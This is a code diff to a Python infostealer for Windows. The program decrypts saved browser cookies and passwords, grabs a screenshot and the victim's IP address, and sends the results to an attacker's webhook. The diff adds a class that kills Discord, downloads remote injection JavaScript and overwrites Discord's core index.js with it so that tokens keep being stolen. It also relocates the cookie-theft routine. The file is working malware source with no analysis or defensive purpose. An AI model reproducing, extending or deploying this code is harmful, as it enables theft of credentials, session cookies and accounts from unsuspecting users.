@@ -9,6 +9,8 @@ import platform
 import socket
 import getpass
 import platform
+import psutil
+import ctypes
 from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -17,6 +19,7 @@ from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from json import loads, dumps
 from zipfile import ZipFile
+from sys import argv
 
 from Crypto.Cipher import AES
 
@@ -49,12 +52,21 @@ def get_ip():
     ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
     return ip
 
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode="w", encoding="utf-8") as f:
+        f.write(f"< - lol -->\n\n")
+        for line in data:
+            if line[0] != "":
+                f.write(f"{line}\n")
+
 hook = cc.get_webhook()
 debug_mode = cc.get_debug_mode()
 footer = cc.get_footer()
 avatar = cc.get_avatar()
 color = cc.get_color()
 print(hook)
+
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
@@ -68,8 +80,7 @@ response = requests.post(hook, json=payload)
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
-
-
+    
 def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
@@ -101,21 +112,70 @@ def DecryptValue(buff, master_key=None):
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
+    
+def Reformat(listt):
+    e = re.findall("(\w+[a-z])", listt)
+    while "https" in e:
+        e.remove("https")
+    while "com" in e:
+        e.remove("com")
+    while "net" in e:
+        e.remove("net")
+    return list(set(e))
+
+class Injection:
+    def __init__(self, webhook: str) -> None:
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.discord_dirs = [
+            self.appdata + '\\Discord',
+            self.appdata + '\\DiscordCanary',
+            self.appdata + '\\DiscordPTB',
+            self.appdata + '\\DiscordDevelopment'
+        ]
+        self.code = requests.get('https://github.com/DamagingRose/Rose-Injector/blob/main/injection/injection.js').text
+
+        for proc in psutil.process_iter():
+            if 'discord' in proc.name().lower():
+                proc.kill()
+
+        for dir in self.discord_dirs:
+            if not os.path.exists(dir):
+                continue
+
+            if self.get_core(dir) is not None:
+                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    self.start_discord(dir)
+
+    def get_core(self, dir: str) -> tuple:
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                modules = dir + '\\' + file + '\\modules'
+                if not os.path.exists(modules):
+                    continue
+                for file in os.listdir(modules):
+                    if re.search(r'discord_desktop_core-+?', file):
+                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
+                        if not os.path.exists(core + '\\index.js'):
+                            continue
+                        return core, file
+
+    def start_discord(self, dir: str) -> None:
+        update = dir + '\\Update.exe'
+        executable = dir.split('\\')[-1] + '.exe'
+
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                app = dir + '\\' + file
+                if os.path.exists(app + '\\' + 'modules'):
+                    for file in os.listdir(app):
+                        if file == executable:
+                            executable = app + '\\' + executable
+                            subprocess.call([update, '--processStart', executable],
+                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
-def LoadRequests(methode, url, data="", files="", headers=""):
-    for i in range(8):  # max trys
-        if methode == "POST":
-            if data != "":
-                r = requests.post(url, data=data)
-                if r.status_code == 200:
-                    return r
-            elif files != "":
-                r = requests.post(url, files=files)
-                if (r.status_code == 200
-                        or r.status_code == 413):  # 413 = DATA TO BIG
-                    return r
-
+Passw = []
 
 def LoadUrlib(hook, data="", files="", headers=""):
     if headers != "":
@@ -127,6 +187,10 @@ def LoadUrlib(hook, data="", files="", headers=""):
         print(r)
         return r
 
+    tempfold = (
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
 
 def globalInfo():
     ip = get_ip()
@@ -158,16 +222,9 @@ def Trust(Cookies):
         return DETECTED
 
 
-def Reformat(listt):
-    e = re.findall("(\w+[a-z])", listt)
-    while "https" in e:
-        e.remove("https")
-    while "com" in e:
-        e.remove("com")
-    while "net" in e:
-        e.remove("net")
-    return list(set(e))
 
+Tokens = ""
+dclass = discordc.DiscordX()
 
 def upload(name, link):
     headers = {
@@ -232,15 +289,6 @@ def upload(name, link):
         #urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
-
-
-def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\wp{name}.txt"
-    with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"< - lol -->\n\n")
-        for line in data:
-            if line[0] != "":
-                f.write(f"{line}\n")
 
 
 Tokens = ""
@@ -320,56 +368,6 @@ def GetPasswords(path, arg):
     writeforfile(Passw, "passw")
 
 
-Cookies = []
-
-
-def GetCookies(path, arg):
-    global Cookies, CookiCount
-    if not os.path.exists(path):
-        return
-
-    pathC = path + arg + "/Cookies"
-    if os.stat(pathC).st_size == 0:
-        return
-
-    tempfold = (
-        temp + "wp" +
-        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
-                for i in range(8)) + ".db")
-
-    shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = path + "/Local State"
-
-    with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = json_loads(f.read())
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data:
-        if row[0] != "":
-            for wa in keyword:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split("[")[1].split("]")[0]
-                if wa in row[0]:
-                    if not old in cookiWords:
-                        cookiWords.append(old)
-            Cookies.append(
-                f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
-            )
-            CookiCount += 1
-    writeforfile(Cookies, "cook")
-
-
 def RobloxCookie(path, arg):
     return
     global roblox_cookie
@@ -395,7 +393,8 @@ def RobloxCookie(path, arg):
     f.close()
 
 
-def UploadRobloxCookie(hook):
+def UploadRobloxCookie(webhook):
+    return
     headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
     info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
     data = {
@@ -555,6 +554,54 @@ def ZipTelegram(path, arg, procc):
     lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
+    
+Cookies = []    
+    
+def GetCookies(path, arg):
+    global Cookies, CookiCount
+    if not os.path.exists(path):
+        return
+
+    pathC = path + arg + "/Cookies"
+    if os.stat(pathC).st_size == 0:
+        return
+
+    tempfold = (
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+
+    with open(pathKey, "r", encoding="utf-8") as f:
+        local_state = json_loads(f.read())
+    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data:
+        if row[0] != "":
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split("[")[1].split("]")[0]
+                if wa in row[0]:
+                    if not old in cookiWords:
+                        cookiWords.append(old)
+            Cookies.append(
+                f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
+            )
+            CookiCount += 1
+    writeforfile(Cookies, "cook")
 
 
 def ZipThings(path, arg, procc):
@@ -974,6 +1021,7 @@ embed = {
 }
 
 requests.post(hook, json={"embeds": [embed]})
+
 
 screenshot = ImageGrab.grab()
 screenshot.save("screenshot.png")
